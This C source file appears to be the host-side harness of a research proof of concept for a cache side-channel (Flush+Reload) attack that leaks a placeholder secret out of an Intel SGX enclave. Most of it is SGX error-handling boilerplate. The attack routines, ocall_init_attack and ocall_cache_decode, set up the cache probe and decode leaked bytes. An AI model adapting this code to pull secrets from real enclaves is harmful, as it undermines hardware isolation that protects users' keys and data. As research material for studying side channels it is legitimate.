#include <stdio.h>
#include <string.h>
#include <assert.h>

# include <unistd.h>
# include <pwd.h>

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"

#include "libcache/cacheutils.h"

//#define DEBUG_PRINT
#define SECRET "INACCESSIBLESECRET"

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

typedef struct _sgx_errlist_t {
    sgx_status_t err;
    const char *msg;
    const char *sug; /* Suggestion */
} sgx_errlist_t;

/* Error code returned by sgx_create_enclave */
static sgx_errlist_t sgx_errlist[] = {
    {
        SGX_ERROR_UNEXPECTED,
        "Unexpected error occurred.",
        NULL
    },
    {
        SGX_ERROR_INVALID_PARAMETER,
        "Invalid parameter.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_MEMORY,
        "Out of memory.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_LOST,
        "Power transition occurred.",
        "Please refer to the sample \"PowerTransition\" for details."
    },
    {
        SGX_ERROR_INVALID_ENCLAVE,
        "Invalid enclave image.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ENCLAVE_ID,
        "Invalid enclave identification.",
        NULL
    },
    {
        SGX_ERROR_INVALID_SIGNATURE,
        "Invalid enclave signature.",
        NULL
    },
    {
        SGX_ERROR_OUT_OF_EPC,
        "Out of EPC memory.",
        NULL
    },
    {
        SGX_ERROR_NO_DEVICE,
        "Invalid SGX device.",
        "Please make sure SGX module is enabled in the BIOS, and install SGX driver afterwards."
    },
    {
        SGX_ERROR_MEMORY_MAP_CONFLICT,
        "Memory map conflicted.",
        NULL
    },
    {
        SGX_ERROR_INVALID_METADATA,
        "Invalid enclave metadata.",
        NULL
    },
    {
        SGX_ERROR_DEVICE_BUSY,
        "SGX device was busy.",
        NULL
    },
    {
        SGX_ERROR_INVALID_VERSION,
        "Enclave version was invalid.",
        NULL
    },
    {
        SGX_ERROR_INVALID_ATTRIBUTE,
        "Enclave was not authorized.",
        NULL
    },
    {
        SGX_ERROR_ENCLAVE_FILE_ACCESS,
        "Can't open enclave file.",
        NULL
    },
    {
        SGX_ERROR_NDEBUG_ENCLAVE,
        "The enclave is signed as product enclave, and can not be created as debuggable enclave.",
        NULL
    },
    {
        SGX_ERROR_MEMORY_MAP_FAILURE,
        "Failed to reserve memory for the enclave.",
        NULL
    },
};

/* Check error conditions for loading enclave */
void print_error_message(sgx_status_t ret)
{
    size_t idx = 0;
    size_t ttl = sizeof sgx_errlist/sizeof sgx_errlist[0];

    for (idx = 0; idx < ttl; idx++) {
        if(ret == sgx_errlist[idx].err) {
            if(NULL != sgx_errlist[idx].sug)
                printf("Info: %s\n", sgx_errlist[idx].sug);
            printf("Error: %s\n", sgx_errlist[idx].msg);
            break;
        }
    }
    
    if (idx == ttl)
        printf("Error: Unexpected error occurred.\n");
}

/* Initialize the enclave:
 *   Call sgx_create_enclave to initialize an enclave instance
 */
int initialize_enclave(void)
{
    sgx_status_t ret = SGX_ERROR_UNEXPECTED;
    
    /* Call sgx_create_enclave to initialize an enclave instance */
    /* Debug Support: set 2nd parameter to 1 */
    ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, NULL, NULL, &global_eid, NULL);
    if (ret != SGX_SUCCESS) {
        print_error_message(ret);
        return -1;
    }

    return 0;
}

/* OCall functions */
void ocall_print_string(const char *str)
{
    /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */

    printf("%s", str);
}

char * create_secret() {
    // allocate secret
    char* secret = (char*)malloc(sizeof(char) * 128);

    if(secret == NULL) {
        printf("allocation of secret failed\n");
    }
    memcpy(secret, SECRET, sizeof(SECRET));

    return secret;
}

char leaked[sizeof(SECRET) + 1];

char* enc_encode(char c){
    cache_encode(c);
}

uint64_t ocall_init_attack(){
    pagesize = 4096;
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();

#ifdef DEBUG_PRINT
    printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);
#endif
    
    char *_mem = (char*)malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);

    flush_shared_memory();

    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;

    // return function pointer
    return (uint64_t)enc_encode;
}

int ocall_cache_decode(int index){
    cache_decode_pretty(leaked, index);
    if (leaked[index] == SECRET[index]){
#ifdef DEBUG_PRINT
        printf("[%d] leaked: %c\t(%d)\n", index, leaked[index], c);
#endif
        leaked[index] = ' ';
        return 1;
    }

    leaked[index] = ' ';
    return 0;
}

/* Application entry */
int SGX_CDECL main(int argc, char *argv[])
{
#ifdef TESTING
    printf("[WARNING]: Running in testing mode (enclave is not used. Attack fully runs within the main process. This test should leak, as everythings reside in the same compartment! Comment the #define TESTING to run the PoC split up into enclave and main-process.)\n");
#endif

    (void)(argc);
    (void)(argv);
    uint64_t result = 0;
#ifdef DEBUG_PRINT
    printf("Start up!\n");
#endif

    /* Initialize the enclave */
    if(initialize_enclave() < 0){
        printf("Enter a character before exit ...\n");
        getchar();
        return -1; 
    }

    sgx_status_t status = ecall_main(global_eid);
    if (status != SGX_SUCCESS) {
        printf("ERROR: ECall failed\n");
        print_error_message(status);
        printf("Enter a character before exit ...\n");
        getchar();
        return -1;
    }

    /* Destroy the enclave */
    sgx_destroy_enclave(global_eid);

#ifdef DEBUG_PRINT
    printf("Info: Measurement completed.\n");
#endif

    if ( 0 == result) {
#ifdef DEBUG_PRINT
	    printf("Info: All test passed.\n");
#endif
    } else {
        printf("ERROR: ....\n");
    }
    return 0;
}